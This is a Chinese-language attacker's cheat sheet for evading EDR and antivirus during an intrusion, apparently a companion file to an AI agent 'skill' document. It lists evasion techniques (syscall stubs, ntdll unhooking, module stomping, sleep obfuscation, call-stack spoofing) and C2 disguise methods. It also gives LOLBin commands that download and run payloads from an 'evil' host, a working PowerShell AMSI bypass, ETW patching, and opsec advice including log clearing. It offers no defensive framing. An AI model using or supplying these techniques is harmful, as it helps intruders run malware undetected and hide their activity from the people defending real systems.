# EDR/AV 对抗与隐蔽行动速查

> 场景：目标环境部署了终端检测（EDR）、杀软或严格的流量审计时，按检测面逐层反制。
> 配套主文档：`../SKILL.md` 第九节（规避阶段）。

---

## 检测面 → 反制手段总表

| 检测面 | 检测器在做什么 | 反制思路 |
|--------|---------------|---------|
| 静态签名 | 比对文件 hash/字节特征/导入表 | 自定义编译、载荷加密、特征漂移 |
| 用户态 Hook | 替换 ntdll 导出函数监控调用 | 直接系统调用 / Unhook / 干净 ntdll 副本 |
| 内核回调 | 进程/线程/镜像加载事件订阅 | 注入受信进程 / 驱动级移除回调 |
| ETW | 事件流采集（进程、网络、文件） | 补丁 EtwEventWrite / 禁用 provider |
| 行为分析 | 调用序列与频率建模 | 拆散动作、延时执行、伪装常规行为 |
| 内存扫描 | 周期扫描可执行内存/RWX 段 | 睡眠加密、模块踩踏、堆加密 |
| 网络审计 | 出站流量域名/协议特征 | 域前置、合法服务中转、流量塑形 |

---

## 用户态 Hook 对抗

### 直接系统调用

不经过 ntdll 导出的 API，在用户态自备 syscall stub 直通内核。实现族：SysWhispers3 / HellsGate / TartarusGate。要点：
- syscall 号按 Windows 版本/架构查表
- 混用间接调用（走 jmp 指令形态）可绕 EDR 对 syscall 指令本身的检测

### Unhooking

恢复被 Hook 的 ntdll 至原始字节：
- 从磁盘重新映射干净的 ntdll 覆盖内存副本
- 从 `\KnownDlls` 区段对象加载
- 从挂起的新进程复制 .text 段

---

## 内存对抗

### 模块踩踏（Module Stomping）

把 shellcode 写进已加载合法 DLL 的 .text 段，属性保持 RX 而非 RWX，内存扫描看到的是正常模块。

### 睡眠混淆

beacon 静默期间将自身代码段加密，唤醒前解密。实现：Ekko / Zilean（Timer 回调驱动），进一步配合内存页属性翻转（RX↔RW）。

### 注入目标选择

优先低监控目标：RuntimeBroker.exe、sihost.exe、taskhostw.exe。
避开：lsass.exe（重监控）、svchost.exe、powershell.exe、cmd.exe 及其子进程树。

---

## 调用栈与行为对抗

- **调用栈欺骗（Call Stack Spoofing）**：伪造返回地址链，让 API 调用呈现为来自合法模块的调用序列，绕基于栈回溯的行为模型
- **线程劫持**：挂起受信进程线程，改其上下文指向载荷
- **延时分段**：把高危动作拆进长间隔窗口，避免触发序列模型

---

## C2 通道伪装

| 技术 | 原理 | 被识破难度 |
|------|------|-----------|
| 域前置 | SNI 指向良性域名，Host 指向 C2 中转 | 高 |
| Cloudflare Workers | C2 流量混入 CF 边缘网络 | 高 |
| 云 API 通道 | 借 Azure/AWS 合法 API 收发指令 | 极高 |
| DoH | 数据编码进 DNS-over-HTTPS 查询 | 中 |
| WebSocket | 长连接混入常规 Web 业务 | 中 |
| ICMP 隧道 | 数据夹带进 ICMP 载荷 | 低（特征明显） |

---

## LOLBins（Living Off the Land）

| 程序 | 用途 | 命令示例 |
|------|------|---------|
| certutil | 下载文件 | `certutil -urlcache -split -f http://evil/payload.exe` |
| mshta | 执行 HTA | `mshta http://evil/payload.hta` |
| rundll32 | 加载 DLL | `rundll32 evil.dll,EntryPoint` |
| regsvr32 | 加载 SCT | `regsvr32 /s /n /u /i:http://evil/file.sct scrobj.dll` |
| wmic | 远程执行 | `wmic /node:target process call create "cmd"` |
| msiexec | 安装 MSI | `msiexec /q /i http://evil/payload.msi` |
| bitsadmin | 下载文件 | `bitsadmin /transfer job http://evil/payload.exe C:\payload.exe` |
| forfiles | 命令执行 | `forfiles /p c:\windows /m notepad.exe /c "cmd /c calc.exe"` |

---

## AMSI/ETW 处理

```powershell
# AMSI：置失败标志（旧手法，特征已被收录，仅作基线）
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed','NonPublic,Static')
$b.SetValue($null,$true)

# 更稳的路：反射补丁 AmsiScanBuffer 前几个字节；或降级 PowerShell v2（无 AMSI）
powershell -version 2

# ETW：补丁 EtwEventWrite 返回 0，或对关键 provider 发 disable 指令
```

---

## 行动安全（OpSec）原则

1. 最小动作——已有凭据不新建、能不碰的不碰，动作越少暴露面越小
2. 时间窗口——目标非工作时间操作，降低人工核查概率
3. 流量塑形——C2 心跳频率与包体大小对齐正常业务
4. 不落盘——内存执行，用完即清；确需落盘则加密+更名+伪装扩展名
5. 日志意识——预先知道每个动作在目标侧产生什么日志，能避则避，避不开则清
6. 蜜罐识别——异常开放服务、过于顺手的凭据、孤立高价值主机都是疑点
7. 分段推进——一次只做一段，跨时间段完成整条链
